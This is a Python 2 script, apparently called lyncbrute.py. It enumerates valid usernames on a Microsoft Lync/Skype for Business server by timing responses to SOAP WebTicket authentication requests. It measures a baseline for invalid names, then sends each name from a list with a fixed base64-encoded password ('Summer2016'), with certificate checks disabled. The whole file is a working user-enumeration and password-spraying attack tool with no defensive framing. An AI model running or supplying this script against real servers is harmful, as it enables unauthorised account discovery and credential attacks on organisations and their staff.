#!/usr/bin/python

#import urllib2
#import ssl

import sys, getopt, os, base64, time, string, random

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def post_xml(userid):
   xml_data = """<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Header><Security s:mustUnderstand="1" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"><UsernameToken><Username>%s</Username><Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">U3VtbWVyMjAxNg==</Password></UsernameToken></Security></s:Header><s:Body><RequestSecurityToken xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" Context="ec86f904-154f-0597-3dee-59eb1b51e731" xmlns="http://docs.oasis-open.org/ws-sx/ws-trust/200512"><TokenType>urn:component:Microsoft.Rtc.WebAuthentication.2010:user-cwt-1</TokenType><RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</RequestType><AppliesTo xmlns="http://schemas.xmlsoap.org/ws/2004/09/policy"><EndpointReference xmlns="http://www.w3.org/2005/08/addressing"><Address>https://2013-lync-fe.contoso.com/WebTicket/WebTicketService.svc/Auth</Address></EndpointReference></AppliesTo><Lifetime><Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">2016-06-07T02:23:36Z</Created><Expires xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">2016-06-07T02:38:36Z</Expires></Lifetime><KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/SymmetricKey</KeyType></RequestSecurityToken></s:Body></s:Envelope>"""%(userid)
   return xml_data

def get_invalid_baseline():
   headers = {'Content-Type': 'text/xml; charset=utf-8'}
   char_set = string.ascii_uppercase + string.digits
   randomstring = ''.join(random.sample(char_set*8, 10))
   tmpusername = "%s\\%s" % (domain, randomstring)
#   print "Full username is %s" % (tmpusername)
   b64username = base64.b64encode(tmpusername.encode('ascii') )
#   print "Base64-encoded version is %s" % b64username

   tmp_xml_data = b64username
   invalid_time = requests.post(targeturl, data=tmp_xml_data, headers=headers, verify=False).elapsed.total_seconds()
   return invalid_time


###############################################################################
# # # # # # # # # # # # # # # # # #    MAIN    # # # # # # # # # # # # # # # #
###############################################################################

# Store input and output file names
ifile=''
ofile=''
domain=''
target=''
 
# Read command line args
myopts, args = getopt.getopt(sys.argv[1:],"t:i:o:d:")

if len(myopts) == 0:
    print "usage: ./lyncbrute.py -t <target> -d <domain> -i <inputfile> -o <outputfile>"
    sys.exit()
 
for o, a in myopts:
    if o == '-t':
        target=a
    elif o == '-i':
        ifile=a
    elif o == '-o':
        ofile=a
    elif o == '-d':
	domain=a
    else:
        print("Usage: %s -t target_ip -i inputfile -o outputfile -d domain" % sys.argv[0])
 
inputfilepath = ((os.path.dirname(os.path.abspath(__file__))) + "/%s") % ifile

targeturl = "https://%s/WebTicket/WebTicketService.svc/Auth" % target



# DEBUG: print our variables that have been passed
print "Target is %s" % target
print "Targeturl is %s" %targeturl
print "Input file path is %s" % inputfilepath
print "ifile is %s" %ifile
#print "ofile is %s" %ofile
print "domain is %s" %domain


## MOVED THIS TO DEF get_invalid_baseline
#send first junk request to get path cached otherwise first result will be delayed
#headers = {'Content-Type': 'text/xml; charset=utf-8'}
#tmp_xml_data = "Y29udG9zb1x0YXNkZmprbGFkc2hsZmpr"
#requests.post(targeturl, data=tmp_xml_data, headers=headers, verify=False).elapsed.total_seconds()

# here we get an average of how long an invalid username takes to return
timing_one = get_invalid_baseline()
#print "Timing one is %s" %timing_one

#timing_two = get_invalid_baseline()
#print "Timing two is %s" %timing_two

#timing_three = get_invalid_baseline()
#print "Timing three is %s" %timing_three

#timing_total = float(timing_one) + float(timing_two) + float(timing_three)
#print "Total of times is %s" % timing_total
#avg_invalid = float(timing_total/3)
#print "Average is %s" % avg_invalid


with open(inputfilepath) as parsedfile:
    data = {}
    lines = (line.rstrip() for line in parsedfile)
    lines = (line for line in lines if line)

    for line in lines:

	tmpusername = "%s\\%s" % (domain, line)

#	print "Full username is %s" % (tmpusername)
#	b64username = base64.b64encode('%s\\%s') % (domain, line)

	b64username = base64.b64encode(tmpusername.encode('ascii') )
#	print "Base64-encoded version is %s" % b64username

	headers = {'Content-Type': 'text/xml; charset=utf-8'}
	xml_data = post_xml(b64username)

#	print "################# DEBUG #######################"
#	print "%s" % xml_data
#	print "################ ------ #######################"


	try:
		lyncposttime = requests.post(targeturl, data=xml_data, headers=headers, verify=False).elapsed.total_seconds()
# this one has timeout set
#		lyncposttime = requests.post(targeturl, data=xml_data, headers=headers, verify=False, timeout=1).elapsed.total_seconds()
		print "Total time for %s was %s" % (tmpusername, lyncposttime)

	except:
		print "MAX TIMEOUT REACHED for %s" % tmpusername

